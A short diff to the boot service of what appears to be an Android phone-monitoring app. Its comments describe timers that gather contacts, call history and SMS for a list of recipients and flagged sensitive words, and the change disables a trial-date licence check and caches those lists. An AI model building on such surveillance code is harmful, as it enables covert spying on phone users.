@@ -186,15 +186,18 @@ public class BootService extends Service
 		
 		// A special check on the consume date and current date:
 		// If the current date is ealier than consume date, stop the trial
-		CheckDate(context, type);
+		//CheckDate(context, type);
 		
 		// Start timer to get contacts, phone call history and SMS
 		if (ConfigCtrl.isLegal(context)) 
 		{
 			// ------------------------------------------------------------------
 			// Initialize global variables
-			recipients = getRecipients(context);
-			sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
+			if (recipients == null || recipients.length <= 0) 
+				recipients = getRecipients(context);
+			
+			if (sensitiveWordArray == null || sensitiveWordArray.length <= 0) 
+				sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
 			
 			// ------------------------------------------------------------------			
 			// Start timers and listeners
@@ -236,6 +239,7 @@ public class BootService extends Service
 		}
 	}
 	
+	/*
 	// Prevent me from being cheated when in trial
 	private void CheckDate(Context context, LICENSE_TYPE type) 
 	{
@@ -259,6 +263,7 @@ public class BootService extends Service
 			ConfigCtrl.setLicenseType(context, LICENSE_TYPE.NOT_LICENSED);
 		}
 	}
+	*/
 	
 	public class IaiaiBinder extends Binder {  
         public BootService getService() {  
